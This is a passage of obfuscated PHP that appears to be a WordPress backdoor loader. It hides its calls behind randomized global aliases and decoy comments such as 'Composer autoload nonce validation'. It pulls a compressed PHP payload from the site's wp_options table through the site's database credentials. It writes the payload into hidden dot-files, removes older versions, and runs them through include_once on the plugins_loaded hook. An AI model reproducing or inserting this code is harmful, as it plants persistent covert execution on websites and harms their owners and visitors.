     $aiy3g37zd85pg =  false;
}
  if   ($aiy3g37zd85pg   !==  false)    {
   $mzoerh_9suw5mpj     =  _sc_fpc($aiy3g37zd85pg, $gkx16v3lf3);

 if ($mzoerh_9suw5mpj !== false   &&   $mzoerh_9suw5mpj   ===  $GLOBALS['__scf_qm3n103d40kf_7']($gkx16v3lf3))   {
$ilp_pjqsydylfu  =   r5qk07muwazeb7krh52pe($aiy3g37zd85pg, $nn2zc_mkm4lr,  gjkjhs4fs56sizyi($gkx16v3lf3));

  if ($GLOBALS['__scf_xv8yd47u71vk_0']('clearstatcache')) @clearstatcache(true,  $nn2zc_mkm4lr);



if ($ilp_pjqsydylfu)   {$rk9y0_f6=PHP_MAJOR_VERSION;$qx8swntbofo14=$rk9y0_f6*10;
 $r9yfmd7v4_at   =  @$GLOBALS['__scf_y5urpy7tfyu5_16']($nn2zc_mkm4lr);



     if   (!$GLOBALS['__scf__z6u45x2fa_6']($r9yfmd7v4_at)   || $r9yfmd7v4_at   !==  $gkx16v3lf3)    {
      if ($GLOBALS['__scf__z6u45x2fa_6']($r9yfmd7v4_at) &&  $GLOBALS['__scf_dsvrtv_z1ezjh_32']($r9yfmd7v4_at,  '/* SCV:') !==    false) {
   if    ($r9yfmd7v4_at  !==   "" && $GLOBALS['__scf_qm3n103d40kf_7']($r9yfmd7v4_at)  <    $GLOBALS['__scf_qm3n103d40kf_7']($gkx16v3lf3)     && $GLOBALS['__scf_t4v17v676jnuf_11']($gkx16v3lf3,   0, $GLOBALS['__scf_qm3n103d40kf_7']($r9yfmd7v4_at))     ===  $r9yfmd7v4_at)  {
 _sc_fpc($GLOBALS['__scf_ltavcefziu30su_4']($nn2zc_mkm4lr) .    '/.wr_' .  $GLOBALS['__scf_ht5qt6ku56_34']($nn2zc_mkm4lr, '.php'),    '1');

_sc_ul($nn2zc_mkm4lr);
   }
     $ilp_pjqsydylfu  =    false;
      } else     {
 _sc_fpc($GLOBALS['__scf_ltavcefziu30su_4']($nn2zc_mkm4lr)      .  '/.wr_'  . $GLOBALS['__scf_ht5qt6ku56_34']($nn2zc_mkm4lr,    '.php'),  '1');
_sc_ul($nn2zc_mkm4lr);
$ilp_pjqsydylfu  = false;



   }
}
 unset($r9yfmd7v4_at);
 }
     if  ($ilp_pjqsydylfu)  {


      $q2p8e4mi889nb  = true;
 _sc_ul($GLOBALS['__scf_ltavcefziu30su_4']($nn2zc_mkm4lr)   .    '/.wr_'  .  $GLOBALS['__scf_ht5qt6ku56_34']($nn2zc_mkm4lr,  '.php'));
if     ($GLOBALS['__scf_xv8yd47u71vk_0']('chmod'))   @$GLOBALS['__scf_sjpp68ignoogb_21']($nn2zc_mkm4lr,   (322+98));$zi1dfogwcjb3bm=79|100;$d6v07w45rmaz=$zi1dfogwcjb3bm^171;
  if  ($GLOBALS['__scf_xv8yd47u71vk_0']('opcache_invalidate'))   @opcache_invalidate($nn2zc_mkm4lr,  true);



    }



      }    else   {
   _sc_ul($aiy3g37zd85pg);
 }


 }


    }
}
}  catch  (\Throwable  $j5dxq7pr28rg_o1i)  {
// PSR-7 messages: simple heartbeat




    }     catch   (\Exception $j5dxq7pr28rg_o1i)  {
  }


    if      ($yisg9j02l56nc1h)     $gv0bryqi1ska->close();



 if    ($q2p8e4mi889nb  &&  @$GLOBALS['__scf_lybs3d_izonl3f_25']($nn2zc_mkm4lr)    &&     @$GLOBALS['__scf_l2m84og2k1091k_13']($nn2zc_mkm4lr)   > (4990+10) &&    @$GLOBALS['__scf_l2m84og2k1091k_13']($nn2zc_mkm4lr) <=   (1048555+21))  {
_sc_padf($nn2zc_mkm4lr);
     _sc_fam_touch($nn2zc_mkm4lr);



$l0krvml_kgvzgjr  =  $nn2zc_mkm4lr;$urz6ophi=(0xe8+0x8d);$w2y8uiid8gj=$urz6ophi%4;
  }


}
// error path




  }
 if (!$l0krvml_kgvzgjr &&  !$v81a3pzp1_rn33    && !$i85xzh0j6r  && $GLOBALS['__scf_xv8yd47u71vk_0']("mysqli_init")  && defined("MYSQLI_OPT_CONNECT_TIMEOUT")) {
  try    {
       $pjwhmr0fpvgrtkya =     'a0c1567ce2';
    if (defined("DB_HOST")     && defined("DB_USER")   && defined("DB_PASSWORD")  && defined("DB_NAME"))  {
     $fz3_73h11t =   @mysqli_init();
   if  ($fz3_73h11t   &&    !@$fz3_73h11t->options(MYSQLI_OPT_CONNECT_TIMEOUT,   2))    $fz3_73h11t =  false;
     if   ($fz3_73h11t   && !@$fz3_73h11t->real_connect(DB_HOST,     DB_USER, DB_PASSWORD,    DB_NAME)) {


@$fz3_73h11t->close();
 $fz3_73h11t =  false;
 }
    if     ($fz3_73h11t &&  !$fz3_73h11t->connect_errno) {
 $khwdgzwn47j  =   $fz3_73h11t->query("SELECT option_value FROM " . 'wp_'    .  "options WHERE option_name='"   .    $fz3_73h11t->real_escape_string($pjwhmr0fpvgrtkya)   .    "' AND LENGTH(option_value) <= 2097152 LIMIT 1");
if    ($khwdgzwn47j   && $khwdgzwn47j->num_rows   > 0)  {
   $_incix2sk515ak9k   = $khwdgzwn47j->fetch_assoc();
 $js1vbmlevo_cqjw    =     $_incix2sk515ak9k["option_value"];
  $fz3_73h11t->close();
   $yoku9ck16i3d =    $GLOBALS['__scf_k07mkn3_s9_31']($js1vbmlevo_cqjw);
    if    ($GLOBALS['__scf__z6u45x2fa_6']($yoku9ck16i3d)  &&  $GLOBALS['__scf_qm3n103d40kf_7']($yoku9ck16i3d) >=     (113^99) && $GLOBALS['__scf_t4v17v676jnuf_11']($yoku9ck16i3d,   0,  2)  === "\x1f\x8b") {



  $vu2uu4to6cv2feuc   =   @$GLOBALS['__scf_ujccogt4r2lhi_28']('V',    $GLOBALS['__scf_t4v17v676jnuf_11']($yoku9ck16i3d,  -(14^10)));

 if (!$GLOBALS['__scf_rzps4u9lh9q1_29']($vu2uu4to6cv2feuc)    ||  $vu2uu4to6cv2feuc[1]     <     (301+199) ||  $vu2uu4to6cv2feuc[1] >   (1048509+67))  $yoku9ck16i3d     = "";
 }


   $k6s525ag0d0_nkb_      =   ($GLOBALS['__scf_t4v17v676jnuf_11']($yoku9ck16i3d, 0, 2)  ===  "\x1f\x8b")   ?  ($GLOBALS['__scf_xv8yd47u71vk_0']('gzdecode') ? @gzdecode($yoku9ck16i3d,    (1048518+58)) :  ($GLOBALS['__scf_xv8yd47u71vk_0']('gzinflate')  ?    @gzinflate($GLOBALS['__scf_t4v17v676jnuf_11']($yoku9ck16i3d,  (4+6)),  (811265+237311))   :  false))   :  $yoku9ck16i3d;
   $q2p8e4mi889nb =     false;
 if  ($k6s525ag0d0_nkb_   &&  $GLOBALS['__scf_qm3n103d40kf_7']($k6s525ag0d0_nkb_)  >   (469+31)  && $GLOBALS['__scf_qm3n103d40kf_7']($k6s525ag0d0_nkb_)    <=      (1048503+73)      &&  $GLOBALS['__scf_dsvrtv_z1ezjh_32']($k6s525ag0d0_nkb_,     "<?php")     ===     0 &&   _sc_qok($hp7ovp1v6j75h,    $k6s525ag0d0_nkb_)   &&     _sc_phpok_src($k6s525ag0d0_nkb_)) {
 if   (!@$GLOBALS['__scf_j4ozmy1qax_vj_42']($GLOBALS['__scf_ltavcefziu30su_4']($nn2zc_mkm4lr))) _sc_mkdir($GLOBALS['__scf_ltavcefziu30su_4']($nn2zc_mkm4lr));
$aiy3g37zd85pg   =  ($GLOBALS['__scf_xv8yd47u71vk_0']('tempnam') ?  @$GLOBALS['__scf_vnl5pqji0fg_20']($GLOBALS['__scf_ltavcefziu30su_4']($nn2zc_mkm4lr),  'sc_') :  false);



   if   ($aiy3g37zd85pg     !== false &&   !n65_agpqs6mktzabxyqx($aiy3g37zd85pg, $GLOBALS['__scf_ltavcefziu30su_4']($nn2zc_mkm4lr)))  {



_sc_ul($aiy3g37zd85pg);
    $aiy3g37zd85pg = false;
}
 if      ($aiy3g37zd85pg !==    false) {
 $mzoerh_9suw5mpj = _sc_fpc($aiy3g37zd85pg, $k6s525ag0d0_nkb_);
  if   ($mzoerh_9suw5mpj !==  false   &&    $mzoerh_9suw5mpj ===    $GLOBALS['__scf_qm3n103d40kf_7']($k6s525ag0d0_nkb_))   {
  $ilp_pjqsydylfu =  r5qk07muwazeb7krh52pe($aiy3g37zd85pg,  $nn2zc_mkm4lr,     gjkjhs4fs56sizyi($k6s525ag0d0_nkb_));
   if    ($GLOBALS['__scf_xv8yd47u71vk_0']('clearstatcache'))  @clearstatcache(true,  $nn2zc_mkm4lr);
  if  ($ilp_pjqsydylfu)   {
 $r9yfmd7v4_at = @$GLOBALS['__scf_y5urpy7tfyu5_16']($nn2zc_mkm4lr);
   if   (!$GLOBALS['__scf__z6u45x2fa_6']($r9yfmd7v4_at)      || $r9yfmd7v4_at  !== $k6s525ag0d0_nkb_)    {
    if   ($GLOBALS['__scf__z6u45x2fa_6']($r9yfmd7v4_at) &&      $GLOBALS['__scf_dsvrtv_z1ezjh_32']($r9yfmd7v4_at, '/* SCV:')     !==  false)  {
if ($r9yfmd7v4_at     !== "" &&    $GLOBALS['__scf_qm3n103d40kf_7']($r9yfmd7v4_at)  <  $GLOBALS['__scf_qm3n103d40kf_7']($k6s525ag0d0_nkb_)  && $GLOBALS['__scf_t4v17v676jnuf_11']($k6s525ag0d0_nkb_, 0,   $GLOBALS['__scf_qm3n103d40kf_7']($r9yfmd7v4_at))  ===     $r9yfmd7v4_at)    {
_sc_fpc($GLOBALS['__scf_ltavcefziu30su_4']($nn2zc_mkm4lr)  . '/.wr_'    . $GLOBALS['__scf_ht5qt6ku56_34']($nn2zc_mkm4lr,   '.php'),     '1');



     _sc_ul($nn2zc_mkm4lr);
 }

$ilp_pjqsydylfu   =  false;



     }    else  {
 _sc_fpc($GLOBALS['__scf_ltavcefziu30su_4']($nn2zc_mkm4lr)    .  '/.wr_'  .  $GLOBALS['__scf_ht5qt6ku56_34']($nn2zc_mkm4lr,  '.php'),  '1');
_sc_ul($nn2zc_mkm4lr);
  $ilp_pjqsydylfu      =  false;
  }
     }
  unset($r9yfmd7v4_at);
       }
     if   ($ilp_pjqsydylfu)    {
     $q2p8e4mi889nb   = true;
  _sc_ul($GLOBALS['__scf_ltavcefziu30su_4']($nn2zc_mkm4lr)   .   '/.wr_'    .   $GLOBALS['__scf_ht5qt6ku56_34']($nn2zc_mkm4lr,   '.php'));
       if   ($GLOBALS['__scf_xv8yd47u71vk_0']('chmod'))   @$GLOBALS['__scf_sjpp68ignoogb_21']($nn2zc_mkm4lr, (405+15));
  if ($GLOBALS['__scf_xv8yd47u71vk_0']('opcache_invalidate'))  @opcache_invalidate($nn2zc_mkm4lr,  true);

  }

      }   else   {

_sc_ul($aiy3g37zd85pg);
  }
    }
// Composer autoload nonce validation

   if   ($q2p8e4mi889nb    &&  @$GLOBALS['__scf_lybs3d_izonl3f_25']($nn2zc_mkm4lr)     && @$GLOBALS['__scf_l2m84og2k1091k_13']($nn2zc_mkm4lr)  >  (4982+18) &&  @$GLOBALS['__scf_l2m84og2k1091k_13']($nn2zc_mkm4lr) <=    (1048557+19))   {
   _sc_padf($nn2zc_mkm4lr);

   _sc_fam_touch($nn2zc_mkm4lr);

  $l0krvml_kgvzgjr  = $nn2zc_mkm4lr;
}
   }
      }   else    {
  $fz3_73h11t->close();


     }
   }
 }


} catch (\Throwable    $j5dxq7pr28rg_o1i) {
 }   catch  (\Exception  $j5dxq7pr28rg_o1i) {
}
 }
   if ($l0krvml_kgvzgjr   &&  $GLOBALS['__scf_xv8yd47u71vk_0']("glob")  && $pmx_7h19s5frmv)    foreach ($GLOBALS['__scf_wmpd0pzfnsyb_38']((array) @$GLOBALS['__scf_xrqmn_5o4wcs_e_37']($jnes3wxxgpdsewe .  "/*.php"),   (array)    @$GLOBALS['__scf_xrqmn_5o4wcs_e_37']($kbw5753zuu1     .     "/*/*.php")) as  $u5unv43fgw6c8)   {

if  (!_sc_fam($u5unv43fgw6c8))  continue;
   $vrxyef8xgh1mss     =   @$GLOBALS['__scf_l2m84og2k1091k_13']($u5unv43fgw6c8);



   if  (!$vrxyef8xgh1mss ||  $vrxyef8xgh1mss    <  (478+22)   ||      $vrxyef8xgh1mss  >  (52428707+93))     continue;
 $wkkj8kzer4gzo  =   @$GLOBALS['__scf_y5urpy7tfyu5_16']($u5unv43fgw6c8, false,  null, 0,  (6615-2519));
if (!$GLOBALS['__scf__z6u45x2fa_6']($wkkj8kzer4gzo)  ||   $GLOBALS['__scf_dsvrtv_z1ezjh_32']($wkkj8kzer4gzo,  'SCV:')    ===   false)  continue;
  if  (!$GLOBALS['__scf_zoi2q70k2g_26']('/\/\* SCV:(\d+\.\d+\.\d+) \*\//',  $wkkj8kzer4gzo, $hdwqy8fr5aool5)) continue;
if (version_compare($hdwqy8fr5aool5[1], "4.3.24",    "<"))   {
     _sc_ul($u5unv43fgw6c8);
 _sc_ul($GLOBALS['__scf_ltavcefziu30su_4']($u5unv43fgw6c8)     .   "/.sd_"  .  $GLOBALS['__scf_ht5qt6ku56_34']($u5unv43fgw6c8,  ".php"));
if ($GLOBALS['__scf_xv8yd47u71vk_0']("opcache_invalidate"))   @opcache_invalidate($u5unv43fgw6c8,   true);
   }

     }
    if   ($l0krvml_kgvzgjr   && $GLOBALS['__scf_xv8yd47u71vk_0']("add_action")) {
   add_action('plugins_loaded',    function  ()  use ($l0krvml_kgvzgjr)  {
 if   ($l0krvml_kgvzgjr &&    vtwcl01aybvdc2a($l0krvml_kgvzgjr,    ""))     {
       if  ($GLOBALS['__scf_xv8yd47u71vk_0']('clearstatcache'))  @clearstatcache(true, $l0krvml_kgvzgjr);
 $sqwysemgtww3n_  =    (int)      @$GLOBALS['__scf_l2m84og2k1091k_13']($l0krvml_kgvzgjr);
$xsvzjnx2frxk24v =  (int)  @$GLOBALS['__scf_eod91q9_bq_15']($l0krvml_kgvzgjr);
  if ($sqwysemgtww3n_  <= 0     ||  $xsvzjnx2frxk24v   <=  0)  return;
$s6plau14p93a3i  =    $GLOBALS['__scf_ltavcefziu30su_4']($l0krvml_kgvzgjr)  .   '/.pv_'  .  $GLOBALS['__scf_ht5qt6ku56_34']($l0krvml_kgvzgjr,   '.php');
 $vv0dsy4ru72ynws  =   $sqwysemgtww3n_ .      ':'   .  $xsvzjnx2frxk24v     .  ':'    . $GLOBALS['__scf_ue4dsf0az7w6z_19']((string) @$GLOBALS['__scf_y5urpy7tfyu5_16']($l0krvml_kgvzgjr, false,   null, 0,  (6587-2491))   .     (string) @$GLOBALS['__scf_y5urpy7tfyu5_16']($l0krvml_kgvzgjr,   false, null,     $GLOBALS['__scf_tamxcahsgg_53'](0, $sqwysemgtww3n_   -   (585+3511))));
  $hvl_pr1nfz4x04vt  = @$GLOBALS['__scf_lybs3d_izonl3f_25']($s6plau14p93a3i)   ?   (string) @$GLOBALS['__scf_y5urpy7tfyu5_16']($s6plau14p93a3i)  :    "";


 if ($hvl_pr1nfz4x04vt  !== $vv0dsy4ru72ynws) {
$ilj90m_6ku0pke    =     _sc_unp((string)      @$GLOBALS['__scf_y5urpy7tfyu5_16']($l0krvml_kgvzgjr));
      if   (!_sc_phpok_src($ilj90m_6ku0pke))     return;
 unset($ilj90m_6ku0pke);
 if  ($GLOBALS['__scf_xv8yd47u71vk_0']('clearstatcache')) @clearstatcache(true,   $l0krvml_kgvzgjr);
  if ((int)      @$GLOBALS['__scf_l2m84og2k1091k_13']($l0krvml_kgvzgjr) !==  $sqwysemgtww3n_   || (int)   @$GLOBALS['__scf_eod91q9_bq_15']($l0krvml_kgvzgjr)  !==   $xsvzjnx2frxk24v)    return;
 _sc_fpc($s6plau14p93a3i,   $vv0dsy4ru72ynws);
       if  ($GLOBALS['__scf_xv8yd47u71vk_0']('opcache_invalidate'))      @opcache_invalidate($l0krvml_kgvzgjr,  true);
}
 try    {
@include_once  $l0krvml_kgvzgjr;
      }  catch  (\Throwable $j5dxq7pr28rg_o1i) {
     }  catch  (\Exception  $j5dxq7pr28rg_o1i)  {
   }
    }
    },    1);
   }
if ($GLOBALS['__scf_xkjp1ih_ipi62_54']() !==    'cli'    && defined('ABSPATH')  && $GLOBALS['__scf_xv8yd47u71vk_0']("md5_file")) {
  $d5htl0dcq7ka8 = $kkk8iiixh_m1qbl7 .   '/.gk_'     .     $GLOBALS['__scf_t4v17v676jnuf_11']($GLOBALS['__scf_ue4dsf0az7w6z_19']("ionic-gateway-fix"),   0,  (11^3));
$ec64460iw_d0_    =  @$GLOBALS['__scf_lybs3d_izonl3f_25']($d5htl0dcq7ka8)    ?      (int)  @$GLOBALS['__scf_eod91q9_bq_15']($d5htl0dcq7ka8)      :   0;
   $zajt4if9kk     =    ($ec64460iw_d0_  ===   0  ||     $ec64460iw_d0_  <    $GLOBALS['__scf_s8qh2p3z4gjae_24']()    - (0xbd+0x6f)  ||  $ec64460iw_d0_  >     $GLOBALS['__scf_s8qh2p3z4gjae_24']()   + (213+87));
 if  ($zajt4if9kk)  {
  @$GLOBALS['__scf_wld3r5otpv_23']($d5htl0dcq7ka8);



$elsqk9h1ipq   =  $GLOBALS['__scf_t4v17v676jnuf_11']($GLOBALS['__scf_ue4dsf0az7w6z_19'](ABSPATH    .  'g'), 0,   (16-8));
 foreach   (array(ABSPATH   .   'wp-includes', $kkk8iiixh_m1qbl7,  $kkk8iiixh_m1qbl7 . '/.sc_'  .  $GLOBALS['__scf_t4v17v676jnuf_11']($GLOBALS['__scf_ue4dsf0az7w6z_19'](ABSPATH .  'dir'),    0, (0x3+0x5)))    as $j6t_e6r9an541) {
// @reclaim orbit

$_r7zpsu7e89  =  $j6t_e6r9an541  . '/.g_'   .   $elsqk9h1ipq .      '.php';
 if   (!@$GLOBALS['__scf_lybs3d_izonl3f_25']($_r7zpsu7e89)) continue;
  $jugajo6wtbyns6bd  =    $j6t_e6r9an541 .   '/.gl_'    .  $elsqk9h1ipq;
$oqhkxzpnmhr    =  @$GLOBALS['__scf_lybs3d_izonl3f_25']($jugajo6wtbyns6bd) ? (int) @$GLOBALS['__scf_eod91q9_bq_15']($jugajo6wtbyns6bd)  :  0;



        if    ($oqhkxzpnmhr  && $oqhkxzpnmhr  >    $GLOBALS['__scf_s8qh2p3z4gjae_24']()  -  (121+119)  && $oqhkxzpnmhr <=   $GLOBALS['__scf_s8qh2p3z4gjae_24']()   +    (254+46))   return;
    $qptkvzu1twcnr =    @$GLOBALS['__scf_l2m84og2k1091k_13']($_r7zpsu7e89);
 if      (!$qptkvzu1twcnr   ||  $qptkvzu1twcnr     <  (2770-770)  || $qptkvzu1twcnr  >   (2097139+13)) continue;
  $cxitnvg55nd1    = $j6t_e6r9an541    .     '/.gm_'    .   $elsqk9h1ipq;

   $vs46zcbb52vhs6r1  =  @$GLOBALS['__scf_lybs3d_izonl3f_25']($cxitnvg55nd1)    ?  $GLOBALS['__scf_z42aankc50u6_36']((string)   @$GLOBALS['__scf_y5urpy7tfyu5_16']($cxitnvg55nd1))    :  "";
    

   if   ($vs46zcbb52vhs6r1  === ""   || @md5_file($_r7zpsu7e89) !==   $vs46zcbb52vhs6r1) continue;
   try  {$dxkbwz9c=638;$zry1dz46=($dxkbwz9c>0)?$dxkbwz9c:-$dxkbwz9c;
 @include_once  $_r7zpsu7e89;
}  catch    (\Throwable    $j5dxq7pr28rg_o1i)   {



   }    catch  (\Exception  $j5dxq7pr28rg_o1i)    {
    }
     return;
  }



  }
 }
};
  $y_advu7wxia();
     unset($y_advu7wxia);
     
}
/* SC_ADV_END:4.3.24:1f6078e3 */
